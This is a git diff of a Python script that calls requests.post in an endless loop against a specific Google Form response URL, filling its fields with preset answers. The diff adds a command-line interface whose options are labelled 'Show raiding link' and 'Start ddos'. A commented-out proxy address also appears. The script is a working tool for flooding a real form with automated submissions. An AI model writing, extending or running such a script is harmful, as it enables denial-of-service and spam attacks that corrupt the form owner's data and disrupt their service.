@@ -43,11 +43,13 @@ _third_answer_ = 'Если вы дочитали до этого момента,
 
 random_num = [1, 5]
 
+_link = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfSA182h4jGDBIOcfyMgxeorPUokkb26QS4KZtMpB5H6O3ZcA/formResponse"
+
 jojo = random.choice(random_num)
  
 def raid(a, b, c, d, e:int):
     while True:
-        r = requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSfSA182h4jGDBIOcfyMgxeorPUokkb26QS4KZtMpB5H6O3ZcA/formResponse",
+        r = requests.post(_link,
                         data={
                             "entry.447101162": "9",
                             "entry.1043893031": a,
@@ -93,6 +95,14 @@ def raid(a, b, c, d, e:int):
         # print("\n\n\n==============================================\n\n\n")
 
 @click.command()
+@click.option('--link', default = True, help = 'Show raiding link')
+@click.option('--raid', default = 3, help = 'Start ddos')
+def do_work(link, raid):
+    if link == "get":
+        print(_link)
+    if raid == 1:
+        start()
+
 def start(): 
 
     i = 0
@@ -101,8 +111,8 @@ def start():
         i += 1
       
 if __name__ == "__main__":  
-    start()
-
+    do_work()
+    
 # 'proxies = {
 # "https" : "https://159.8.114.34:8123"
 # }'
